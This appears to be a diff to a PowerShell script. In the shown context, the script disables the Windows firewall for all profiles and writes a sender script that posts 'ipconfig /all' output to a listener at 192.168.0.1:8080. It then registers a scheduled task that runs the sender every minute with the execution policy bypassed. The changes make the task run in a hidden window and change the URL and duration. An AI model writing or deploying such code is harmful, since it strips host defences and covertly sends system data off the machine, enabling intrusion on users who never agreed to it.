@@ -75,7 +75,7 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 $filePath = Join-Path $dirPath "sender.ps1"
 
 @'
-$url = "http://192.168.0.1:8080/Box"
+$url = "http://192.168.0.1:8080"
 
 $output = ipconfig /all | Out-String
 
@@ -91,13 +91,13 @@ $taskName   = "RunSenderPS1"
 
 $action = New-ScheduledTaskAction `
     -Execute "powershell.exe" `
-    -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$filePath`""
+    -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`""
 
 $trigger = New-ScheduledTaskTrigger `
     -Once `
     -At (Get-Date) `
     -RepetitionInterval (New-TimeSpan -Minutes 1) `
-    -RepetitionDuration ([TimeSpan]::MaxValue)
+    -RepetitionDuration (New-TimeSpan -Days 365)
 
 Register-ScheduledTask `
     -TaskName $taskName `
